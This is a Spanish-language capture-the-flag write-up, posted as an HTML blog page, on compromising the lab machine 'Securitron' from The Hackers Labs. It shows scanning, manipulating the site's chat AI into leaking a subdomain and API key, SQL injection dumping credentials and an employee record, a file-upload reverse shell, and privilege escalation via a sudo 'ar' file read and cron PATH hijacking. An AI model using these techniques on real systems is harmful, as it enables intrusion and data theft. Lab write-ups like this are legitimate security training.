@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Securitron</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Securitron</h2>
+          <small class="date">15 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">profesional</a>
+            
+          </div>
+        </div>
+        <div class="content"><p><img src="/assets/images/securitron/0.jpg" alt="image" /></p>
+
+<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por <strong>lenam</strong> de dificultad <strong>profesional</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos buscando que dispositivos hay activos en nuestra red con <code class="language-plaintext highlighter-rouge">arp-scam</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s8 <span class="nt">--localnet</span>
+10.0.2.172      08:00:27:0e:a1:1d       PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<p>Encontramos la dirección IP de nuestro server víctima <code class="language-plaintext highlighter-rouge">10.0.2.172</code>.</p>
+
+<p>Una vez que tenemos la IP vamos a ver que puertos tiene abiertos con <code class="language-plaintext highlighter-rouge">rustscan</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.0.2.172 <span class="nt">-b</span> 20
+Open 10.0.2.172:22
+Open 10.0.2.172:80
+</code></pre></div></div>
+
+<p>Vemos que tiene el puerto 22 y 80 abiertos. Vamos a ver con <code class="language-plaintext highlighter-rouge">nmap -sCV</code> que versiones tienen:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.172
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 672eb14de67df9ecfb73e4eb5ebb265f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b314aa48fefc4726d1fa9325cff15ebc <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Securitron
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
+</code></pre></div></div>
+
+<p>No encontramos nada relevante, vamos a explorar la web.</p>
+
+<p>Entramos a la url y vemos que es un chat con una inteligencia artificial. Jugamos con la IA y al final conseguimos que nos de información relevante al dominio y a la web.</p>
+
+<p><img src="/assets/images/securitron/1.png" alt="image" /></p>
+
+<p>Nos a proporcionado un subdominio y una API-key.</p>
+
+<p>Añadimos el subdominio al fichero <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.0.2.172 admin19-32.securitron.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.0.2.172 admin19-32.securitron.thl
+</code></pre></div></div>
+
+<p>Realizamos un escaneo por fuerza bruta para encontrar url relevantes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://admin19-32.securitron.thl <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php
+...
+200      GET      111l      300w     5201c http://admin19-32.securitron.thl/Account/login.php
+200      GET       19l       89w     1583c http://admin19-32.securitron.thl/Account/
+...
+</code></pre></div></div>
+
+<p>Entre otras encontramos un panel de <strong>login</strong>.</p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Capturamos la petición con <code class="language-plaintext highlighter-rouge">Caido</code> o <code class="language-plaintext highlighter-rouge">Burp Suite</code> y lanzamos <code class="language-plaintext highlighter-rouge">ghauri</code> en busca de alguna vulnerabilidad <strong>SQLi:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt
+Ghauri identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 53 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: txtusername <span class="o">(</span>POST<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vemos que existe una vulnerabilidad <strong>SQLi</strong>. Le pedimos que nos de las BBDD existentes/</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">--dbs</span>
+available databases <span class="o">[</span>2]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> pms_db
+</code></pre></div></div>
+
+<p>En este caso nos interesa la base de datos <strong>pms_db</strong>. Le pedimos las tablas de esa BBDD:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">--tables</span>
+Database: pms_db
+<span class="o">[</span>3 tables]
++-------------+
+| <span class="nb">users</span>       |
+| tblemployee |
+| tblleave    |
++-------------+
+</code></pre></div></div>
+
+<p>Ahora vamos a dumpear las tablas <strong>tblemployee</strong> y <strong>users</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">-T</span> tblemployee <span class="nt">--dump</span>
+Database: pms_db
+Table: tblemployee
+<span class="o">[</span>1 entries]
++----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
+| <span class="nb">id</span> | employeeID          | fullname       | password    | sex  | email                         | dob       | phone       | address     | qualification | dept    | employee_type | date_appointment | basic_salary | gross_pay | status | leave_status | photo                     |
++----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
+| 7  | STAFF/FKP/2023/4860 | Ndueso Akpabio | escobar2012 | Male | newleastpaysolution@gmail.com | 12/9/1980 | 08067361023 | 12 Ikono rd | Msc           | Bursary | Academic      | 9/9/2023         | 21000        | 25000     | 1      | Pending      | uploadImage/Profile/2.png |
++----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
+Database: pms_db
+Table: <span class="nb">users</span>
+<span class="o">[</span>1 entries]
++----------+--------------+-----------+----------+------------------------+
+| username | password     | phone     | fullname | photo                  |
++----------+--------------+-----------+----------+------------------------+
+| admin    | Ntpqc6Z7MDkG | 699696969 | Lenam    | uploadImage/avatar.png |
++----------+--------------+-----------+----------+------------------------+
+
+</code></pre></div></div>
+
+<p>Entramos al panel de admin con las credenciales.</p>
+
+<p><img src="/assets/images/securitron/2.png" alt="image" /></p>
+
+<p>En el apartado de cambiar de avatar vemos que podemos subir imágenes.</p>
+
+<p><img src="/assets/images/securitron/3.png" alt="image" /></p>
+
+<p>Subimos una reverse shell con extension <strong>png</strong>, capturamos con <strong>Caido</strong> la petición y le cambiamos la extension a <strong>php</strong>.</p>
+
+<p>Nos ponemos a la escucha con <strong>Netcat</strong> y obtenemos la shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8888
+Ncat: Listening on 0.0.0.0:8888
+Ncat: Connection from 10.0.2.172.
+Ncat: Connection from 10.0.2.172:43200.
+</code></pre></div></div>
+
+<p>Hacemos el tratamiento de la tty y ya estamos dentro.</p>
+
+<p>Hacemos una busqueda de ficheros con el bit SUID activo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+/usr/bin/x86_64-linux-gnu-ar
+</code></pre></div></div>
+
+<p>Encontramos en <a href="https://gtfobins.github.io/gtfobins/ar/#suid">GTFOBins</a> que podemos leer ficheros del sistema como si fueramos <strong>root.</strong>  Vamos a leer el fichero <strong>user.txt.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Securitron:/<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
+www-data@TheHackersLabs-Securitron:/<span class="nv">$ LFILE</span><span class="o">=</span>/home/securitybot/user.txt
+www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span>/usr/bin/x86_64-linux-gnu-ar r <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
+www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span>
+<span class="o">!</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span>
+user.txt/       0           0     0     644     74        <span class="sb">`</span>
+463061<span class="k">*********</span>
+
+No olvides la contraseña: 0KjcFEkuUEXG
+www-data@TheHackersLabs-Securitron:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Encontramos la flag de user y la contraseña del usuario <strong>securitybot</strong>. Nos logeamos con el usuario y vemos que puede ejecutar como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host TheHackersLabs-Securitron: Name or service not known
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>securitybot: 
+Matching Defaults entries <span class="k">for </span>securitybot on TheHackersLabs-Securitron:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User securitybot may run the following commands on TheHackersLabs-Securitron:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/ar
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vemos que puede ejecutar como <strong>root</strong> el binario <code class="language-plaintext highlighter-rouge">ar</code>.  Si intentamos leer la flag de root nos encontramos con un mensaje diciendo que no esta hay la flag.</p>
+
+<p>Seguimos enumerando el servidor:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/
+total 12
+drwxr-xr-x  2 root root 4096 Jul 31 13:09 <span class="nb">.</span>
+drwxr-xr-x 18 root root 4096 Sep  8 17:45 ..
+<span class="nt">-rwxr-xr-x</span>  1 root root  767 Jul 31 12:49 backup_bd.sh
+</code></pre></div></div>
+
+<p>Encontramos un script que que hace un backup de la BBDD. Vamos a ver que hace el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">cat</span> /opt/backup_bd.sh 
+<span class="c">#!/bin/bash</span>
+
+<span class="c"># Verificar si se pasó un argumento (la fecha)</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+  </span><span class="nb">echo</span> <span class="s2">"Uso: </span><span class="nv">$0</span><span class="s2"> &lt;fecha&gt;"</span>
+  <span class="nb">exit </span>1
+<span class="k">fi</span>
+
+<span class="c"># Variables</span>
+<span class="nv">FECHA</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">USUARIO</span><span class="o">=</span><span class="s2">"matomo"</span>
+<span class="nv">CONTRASENA</span><span class="o">=</span><span class="s2">"7pUYlPYpziv1"</span>
+<span class="nv">BASE_DATOS</span><span class="o">=</span><span class="s2">"pms_db"</span>
+<span class="nv">CARPETA_BACKUP</span><span class="o">=</span><span class="s2">"/root/backups"</span>
+<span class="nv">NOMBRE_BACKUP</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">CARPETA_BACKUP</span><span class="k">}</span><span class="s2">/backup_</span><span class="k">${</span><span class="nv">BASE_DATOS</span><span class="k">}</span><span class="s2">_</span><span class="k">${</span><span class="nv">FECHA</span><span class="k">}</span><span class="s2">.sql"</span>
+
+<span class="c"># Crear carpeta de backups si no existe</span>
+/bin/mkdir <span class="nt">-p</span> <span class="nv">$CARPETA_BACKUP</span>
+
+<span class="c"># Crear backup</span>
+/usr/bin/mysqldump <span class="nt">-u</span> <span class="nv">$USUARIO</span> <span class="nt">-p</span><span class="nv">$CONTRASENA</span> <span class="nv">$BASE_DATOS</span> <span class="o">&gt;</span> <span class="nv">$NOMBRE_BACKUP</span>
+
+<span class="c"># Verificar si el backup se creó exitosamente</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+  </span><span class="nb">echo</span> <span class="s2">"Backup creado exitosamente: </span><span class="nv">$NOMBRE_BACKUP</span><span class="s2">"</span>
+<span class="k">else
+  </span><span class="nb">echo</span> <span class="s2">"Error al crear el backup"</span>
+  <span class="nb">exit </span>1
+<span class="k">fi</span>
+
+<span class="c"># Mantener solo los dos últimos backups</span>
+/bin/ls <span class="nt">-t</span> <span class="nv">$CARPETA_BACKUP</span> | /usr/bin/sed <span class="nt">-e</span> <span class="s1">'1,2d'</span> | /usr/bin/xargs <span class="nt">-d</span> <span class="s1">'\n'</span> /bin/rm <span class="nt">-f</span>
+</code></pre></div></div>
+
+<p>Vamos a ver si hay alguna tarea <strong>cron</strong> con <code class="language-plaintext highlighter-rouge">pspy64</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1903   | /usr/sbin/CRON <span class="nt">-f</span> 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1904   | /usr/sbin/CRON <span class="nt">-f</span> 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1905   | /bin/sh <span class="nt">-c</span> /opt/backup_bd.sh <span class="sb">`</span><span class="nb">date</span> +%F<span class="sb">`</span> 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1906   | 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1907   | /bin/mkdir <span class="nt">-p</span> /root/backups 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1908   | /bin/bash /opt/backup_bd.sh 2024-09-14 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1911   | /bin/bash /opt/backup_bd.sh 2024-09-14 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1910   | 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1909   | /bin/ls <span class="nt">-t</span> /root/backups 
+2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1912   | /usr/bin/xargs <span class="nt">-d</span> <span class="se">\n</span> /bin/rm <span class="nt">-f</span> 
+
+</code></pre></div></div>
+
+<p>Vemos que hay una tarea de <strong>root</strong>. Como podemos leer ficheros como <strong>root</strong> con el binario <code class="language-plaintext highlighter-rouge">ar</code>, vamos a ver que contiene el fichero <strong>cron</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
+<span class="nv">LFILE</span><span class="o">=</span>/var/spool/cron/crontabs/root
+<span class="nb">sudo </span>ar r <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
+<span class="nb">cat</span> <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span>
+
+<span class="o">!</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span>
+root/           0           0     0     644     1239      <span class="sb">`</span>
+<span class="c"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
+<span class="c"># (/tmp/crontab.3cCTUG/crontab installed on Thu Aug 22 23:03:21 2024)</span>
+<span class="c"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin"</span>
+<span class="nv">MAILTO</span><span class="o">=</span><span class="s2">""</span>
+<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
+<span class="c"># </span>
+<span class="c"># Each task to run has to be defined through a single line</span>
+<span class="c"># indicating with different fields when the task will be run</span>
+<span class="c"># and what command to run for the task</span>
+<span class="c"># </span>
+<span class="c"># To define the time you can provide concrete values for</span>
+<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
+<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').</span>
+<span class="c"># </span>
+<span class="c"># Notice that tasks will be started based on the cron's system</span>
+<span class="c"># daemon's notion of time and timezones.</span>
+<span class="c"># </span>
+<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
+<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
+<span class="c"># </span>
+<span class="c"># For example, you can run a backup of all your user accounts</span>
+<span class="c"># at 5 a.m every week with:</span>
+<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+<span class="c"># </span>
+<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
+<span class="c"># </span>
+<span class="c"># m h  dom mon dow   command</span>
+<span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>     /opt/backup_bd.sh <span class="sb">`</span><span class="nb">date</span> +<span class="se">\%</span>F<span class="sb">`</span>
+
+</code></pre></div></div>
+
+<p>Si nos fijamos en el <strong>PATH</strong> vemos que hay un directorio dentro del home del usuario en el que tenemos permiso de escritura. También vemos que usa el comando <code class="language-plaintext highlighter-rouge">date</code> sin la ruta completa. Vamos a realizar un <strong>path hijacking</strong>. Creamos un fichero con el nombre <strong>date</strong> y con permiso de <strong>ejecución</strong> en el directorio <strong>/home/securitybot/.local/bin:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">chmod</span> +s /usr/bin/bash
+</code></pre></div></div>
+
+<p>Ahora esperamos a que se ejecute la tarea:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span>watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-l</span> /usr/watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/bash
+</code></pre></div></div>
+
+<p>Y ya solo queda ejecutar <code class="language-plaintext highlighter-rouge">bash -p</code> para ser <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.2# <span class="nb">whoami
+</span>root
+bash-5.2# <span class="nb">hostname
+</span>TheHackersLabs-Securitron
+bash-5.2#
+</code></pre></div></div>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
